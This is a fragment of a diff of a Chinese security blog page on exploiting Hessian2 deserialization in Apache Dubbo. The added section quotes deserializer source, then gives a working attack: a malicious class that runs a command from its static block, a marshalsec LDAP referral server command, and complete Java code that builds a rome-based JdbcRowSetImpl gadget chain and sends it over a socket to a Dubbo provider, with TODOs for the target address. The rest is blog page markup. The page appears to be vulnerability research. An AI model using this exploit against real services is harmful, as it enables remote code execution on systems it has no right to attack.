+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException &#123;</span><br><span class="line">    Map map;</span><br><span class="line"></span><br><span class="line">    if (_type == null)</span><br><span class="line">        map = new HashMap();</span><br><span class="line">    else if (_type.equals(Map.class))</span><br><span class="line">        map = new HashMap();</span><br><span class="line">    else if (_type.equals(SortedMap.class))</span><br><span class="line">        map = new TreeMap();</span><br><span class="line">    else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            map = (Map) _ctor.newInstance();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            throw new IOExceptionWrapper(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    in.addRef(map);</span><br><span class="line"></span><br><span class="line">    doReadMap(in, map, expectKeyType, expectValueType);</span><br><span class="line"></span><br><span class="line">    in.readEnd();</span><br><span class="line"></span><br><span class="line">    return map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>-&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;</span><br><span class="line">    Deserializer keyDeserializer = null, valueDeserializer = null;</span><br><span class="line"></span><br><span class="line">    SerializerFactory factory = findSerializerFactory(in);</span><br><span class="line">    if(keyType != null)&#123;</span><br><span class="line">        keyDeserializer = factory.getDeserializer(keyType.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    if(valueType != null)&#123;</span><br><span class="line">        valueDeserializer = factory.getDeserializer(valueType.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (!in.isEnd()) &#123;</span><br><span class="line">        map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),</span><br><span class="line">                valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从上面贴出来的部分执行栈信息，可以清晰的看到，最终在反序列化中实例化了新的HashMap，然后把反序列化出来的实例put进去，因此，会触发key的hashCode方法。</p>
+<p>创建gadget chain：</p>
+<ul>
+<li>具有rome依赖的gadget chain</li>
+</ul>
+<p>依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.rometools&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>创建恶意class，放到http服务器（80端口）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class ExecObject &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动ldap服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/#ExecObject 44321</span><br></pre></td></tr></table></figure>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl rs = new JdbcRowSetImpl();</span><br><span class="line">//todo 此处填写ldap url</span><br><span class="line">rs.setDataSourceName(&quot;ldap://127.0.0.1:43658/ExecObject&quot;);</span><br><span class="line">rs.setMatchColumn(&quot;foo&quot;);</span><br><span class="line">Reflections.getField(javax.sql.rowset.BaseRowSet.class, &quot;listeners&quot;).set(rs, null);</span><br><span class="line"></span><br><span class="line">ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);</span><br><span class="line">EqualsBean root = new EqualsBean(ToStringBean.class, item);</span><br><span class="line"></span><br><span class="line">HashMap s = new HashMap&lt;&gt;();</span><br><span class="line">Reflections.setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">Class&lt;?&gt; nodeC;</span><br><span class="line">try &#123;</span><br><span class="line">  nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch ( ClassNotFoundException e ) &#123;</span><br><span class="line">  nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">nodeCons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));</span><br><span class="line">Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));</span><br><span class="line">Reflections.setFieldValue(s, &quot;table&quot;, tbl);</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">// header.</span><br><span class="line">byte[] header = new byte[16];</span><br><span class="line">// set magic number.</span><br><span class="line">Bytes.short2bytes((short) 0xdabb, header);</span><br><span class="line">// set request and serialization flag.</span><br><span class="line">header[2] = (byte) ((byte) 0x80 | 2);</span><br><span class="line"></span><br><span class="line">// set request id.</span><br><span class="line">Bytes.long2bytes(new Random().nextInt(100000000), header, 4);</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">out.writeUTF(&quot;2.0.2&quot;);</span><br><span class="line">//todo 此处填写注册中心获取到的service全限定名、版本号、方法名</span><br><span class="line">out.writeUTF(&quot;com.threedr3am.learn.server.boot.DemoService&quot;);</span><br><span class="line">out.writeUTF(&quot;1.0&quot;);</span><br><span class="line">out.writeUTF(&quot;hello&quot;);</span><br><span class="line">//todo 方法描述不需要修改，因为此处需要指定map的payload去触发</span><br><span class="line">out.writeUTF(&quot;Ljava/util/Map;&quot;);</span><br><span class="line">out.writeObject(s);</span><br><span class="line">out.writeObject(new HashMap());</span><br><span class="line"></span><br><span class="line">out.flushBuffer();</span><br><span class="line">if (out instanceof Cleanable) &#123;</span><br><span class="line">  ((Cleanable) out).cleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);</span><br><span class="line">byteArrayOutputStream.write(header);</span><br><span class="line">byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">byte[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">//todo 此处填写被攻击的dubbo服务提供者地址和端口</span><br><span class="line">Socket socket = new Socket(&quot;127.0.0.1&quot;, 20880);</span><br><span class="line">OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">outputStream.write(bytes);</span><br><span class="line">outputStream.flush();</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure>
 <p>我这里把gadget chain的demo放在github上，感兴趣的可以clone下来试试：<a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a></p>
 <p>具体代码位于com.threedr3am.bug.dubbo包下</p>
 <ul>
@@ -727,9 +620,9 @@ while (!in.isEnd()) {
       
         <div class="post-tags">
           
-            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
-          
             <a href="/tags/dubbo/" rel="tag"># dubbo</a>
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
           
             <a href="/tags/hessian2/" rel="tag"># hessian2</a>
           
@@ -900,6 +793,10 @@ while (!in.isEnd()) {
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
+                    <a href="https://www.k3f.xyz/" title="Levi4than" target="_blank">Levi4than</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
                     <a href="http://www.j10.monster/" title="Just1earnm0re" target="_blank">Just1earnm0re</a>
                   </li>
                 
@@ -954,7 +851,7 @@ while (!in.isEnd()) {
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、前言"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、源码浅析"><span class="nav-number">2.</span> <span class="nav-text">二、源码浅析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-简单使用"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-1-启动注册中心（zookeeper）"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1.1 启动注册中心（zookeeper）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-2-服务端"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.1.2 服务端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-3-客户端"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.1.3 客户端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-4-RPC"><span class="nav-number">2.1.4.</span> <span class="nav-text">2.1.4 RPC</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-源码跟踪"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 源码跟踪</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、hessian2反序列化"><span class="nav-number">3.</span> <span class="nav-text">三、hessian2反序列化</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、前言"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、源码浅析"><span class="nav-number">2.</span> <span class="nav-text">二、源码浅析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-简单使用"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-1-启动注册中心（zookeeper）"><span class="nav-number">2.1.1.</span> <span class="nav-text">2.1.1 启动注册中心（zookeeper）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-2-服务端"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.1.2 服务端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-3-客户端"><span class="nav-number">2.1.3.</span> <span class="nav-text">2.1.3 客户端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-4-RPC"><span class="nav-number">2.1.4.</span> <span class="nav-text">2.1.4 RPC</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-源码跟踪"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 源码跟踪</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、hessian2反序列化"><span class="nav-number">3.</span> <span class="nav-text">三、hessian2反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、反序列化利用-hessian2"><span class="nav-number">4.</span> <span class="nav-text">四、反序列化利用(hessian2)</span></a></li></ol></div>
             
 
           </div>
@@ -974,7 +871,7 @@ while (!in.isEnd()) {
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
